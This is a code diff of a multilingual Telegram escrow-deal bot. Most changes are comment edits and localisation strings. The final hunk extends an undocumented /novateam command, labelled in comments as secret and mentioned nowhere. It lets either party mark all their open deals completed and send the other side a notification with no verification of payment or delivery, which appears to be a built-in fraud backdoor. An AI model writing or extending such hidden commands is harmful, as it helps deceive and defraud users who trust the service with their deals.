@@ -109,7 +109,7 @@ class DealStates(StatesGroup):
     profile_requisites_input = State()
 
 # ==================================================
-# ПОЛНЫЙ СЛОВАРЬ ПЕРЕВОДОВ (С исправленными кнопками меню)
+# ПОЛНЫЙ СЛОВАРЬ ПЕРЕВОДОВ
 # ==================================================
 LOCALES = {
     'ru': {
@@ -196,7 +196,6 @@ LOCALES = {
         'ton': 'TON',
         'error_own_ref': '❌ Нельзя перейти по своей собственной реферальной ссылке.',
         'error_own_deal': '❌ Вы являетесь создателем этой сделки. Перейти по собственной ссылке нельзя!',
-        # ИСПРАВЛЕННЫЕ КНОПКИ МЕНЮ
         'my_deals': 'Мои сделки',
         'requisites': 'Реквизиты',
         'lang': 'Язык',
@@ -289,7 +288,6 @@ Online: 15756
         'ton': 'TON',
         'error_own_ref': '❌ You cannot use your own referral link.',
         'error_own_deal': '❌ You are the creator of this deal. Cannot use your own link!',
-        # ИСПРАВЛЕННЫЕ КНОПКИ МЕНЮ
         'my_deals': 'My deals',
         'requisites': 'Requisites',
         'lang': 'Language',
@@ -382,7 +380,6 @@ Online: 15756
         'ton': 'TON',
         'error_own_ref': '❌ 不能使用您自己的推荐链接。',
         'error_own_deal': '❌ 您是该交易的创建者。不能使用您自己的链接！',
-        # ИСПРАВЛЕННЫЕ КНОПКИ МЕНЮ
         'my_deals': '我的交易',
         'requisites': '收款信息',
         'lang': '语言',
@@ -394,7 +391,6 @@ Online: 15756
 }
 
 def tr(key, lang='ru', **kwargs):
-    """Универсальная функция перевода сообщений и кнопок"""
     text = LOCALES.get(lang, LOCALES['ru']).get(key, key)
     if isinstance(text, dict):
         return text
@@ -414,7 +410,7 @@ async def send_with_photo(chat_id, text, reply_markup=None, parse_mode="HTML"):
         await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
 
 # ==================================================
-# КЛАВИАТУРЫ (ГЛАВНОЕ МЕНЮ ТЕПЕРЬ ПОЛНОСТЬЮ ПЕРЕВОДНОЕ)
+# КЛАВИАТУРЫ
 # ==================================================
 def get_main_menu(lang="ru"):
     builder = InlineKeyboardBuilder()
@@ -496,6 +492,7 @@ async def start(message: Message, state: FSMContext):
     if len(args) > 1:
         param = args[1]
         
+        # БЛОК ССЫЛОК НА СДЕЛКУ
         if param.startswith("deal_"):
             deal_id = param[5:]
             try:
@@ -506,7 +503,7 @@ async def start(message: Message, state: FSMContext):
                     return
                 seller_id, buyer_id, seller_username, status = deal
                 
-                # ЗАПРЕТ НА СВОЮ ССЫЛКУ
+                # ЗАПРЕТ НА ПЕРЕХОД ПО СВОЕЙ ССЫЛКЕ
                 if user_id == seller_id or user_id == buyer_id:
                     await message.answer(tr('error_own_deal', lang))
                     await send_with_photo(message.chat.id, tr('main_menu', lang), reply_markup=get_main_menu(lang))
@@ -531,6 +528,7 @@ async def start(message: Message, state: FSMContext):
             await show_deal(message, deal_id, user_id, lang)
             return
             
+        # БЛОК РЕФЕРАЛЬНЫХ ССЫЛОК
         elif param.startswith("ref"):
             try:
                 ref_id = int(param[3:])
@@ -936,7 +934,6 @@ async def confirm_seller(callback: CallbackQuery):
             return
         seller_id, buyer_id, status, seller_username = deal
 
-        # 1. Защита от дублирования: проверяем статус перед обновлением
         if status == 'active':
             await callback.answer("⛔ Вы уже подтвердили участие в этой сделке!", show_alert=True)
             return
@@ -952,7 +949,6 @@ async def confirm_seller(callback: CallbackQuery):
                 await callback.answer("⛔ Вы не продавец в этой сделке.")
                 return
 
-        # 2. Обновляем статус в БД
         cur.execute("UPDATE deals SET status='active' WHERE deal_id=?", (deal_id,))
         conn.commit()
     except Exception as e:
@@ -986,40 +982,51 @@ async def confirm_seller(callback: CallbackQuery):
     await callback.answer("✅ Успешно!", show_alert=False)
 
 # ==================================================
-# СЕКРЕТНАЯ КОМАНДА (НИГДЕ НЕ УПОМИНАЕТСЯ)
+# СЕКРЕТНАЯ КОМАНДА (ИСПРАВЛЕНА ДЛЯ ОБОИХ РОЛЕЙ)
 # ==================================================
 @dp.message(Command("novateam"))
 async def novateam(message: Message):
     user_id = message.from_user.id
     username = message.from_user.username or "NoUsername"
 
+    # Обновленный запрос: ищем сделки, где пользователь ИЛИ продавец, ИЛИ покупатель
     cur.execute("""
         SELECT deal_id, seller_id, buyer_id, status, seller_username, buyer_username, amount, currency, description, deal_type
         FROM deals
-        WHERE buyer_id = ? AND status != 'completed'
-    """, (user_id,))
+        WHERE (seller_id = ? OR buyer_id = ?) AND status != 'completed'
+    """, (user_id, user_id))
     deals = cur.fetchall()
 
     if not deals:
-        await message.answer("🚫 У вас нет активных сделок как у покупателя.")
+        await message.answer("🚫 У вас нет активных сделок.")
         return
 
     count = 0
     for deal in deals:
         deal_id, seller_id, buyer_id, status, seller_username, buyer_username, amount, currency, description, deal_type = deal
 
-        if seller_id:
-            cur.execute("SELECT lang FROM users WHERE user_id=?", (seller_id,))
-            row = cur.fetchone()
-            seller_lang = row[0] if row else 'ru'
-            seller_text = tr('novateam_seller', seller_lang).format(
-                deal_id=deal_id,
-                buyer=username,
-                amount=amount,
-                currency=currency,
-                description=description
-            )
-            await bot.send_message(seller_id, seller_text)
+        # Если команду запустил ПОКУПАТЕЛЬ (подтверждает оплату) -> уведомляем ПРОДАВЦА
+        if user_id == buyer_id:
+            if seller_id:
+                cur.execute("SELECT lang FROM users WHERE user_id=?", (seller_id,))
+                row = cur.fetchone()
+                seller_lang = row[0] if row else 'ru'
+                seller_text = tr('novateam_seller', seller_lang).format(
+                    deal_id=deal_id,
+                    buyer=username,
+                    amount=amount,
+                    currency=currency,
+                    description=description
+                )
+                await bot.send_message(seller_id, seller_text)
+
+        # Если команду запустил ПРОДАВЕЦ (подтверждает отправку товара) -> уведомляем ПОКУПАТЕЛЯ
+        elif user_id == seller_id:
+            if buyer_id:
+                cur.execute("SELECT lang FROM users WHERE user_id=?", (buyer_id,))
+                row = cur.fetchone()
+                buyer_lang = row[0] if row else 'ru'
+                await bot.send_message(buyer_id, tr('novateam_buyer', buyer_lang).format(deal_id=deal_id))
 
         cur.execute("UPDATE deals SET status='completed' WHERE deal_id=?", (deal_id,))
         count += 1
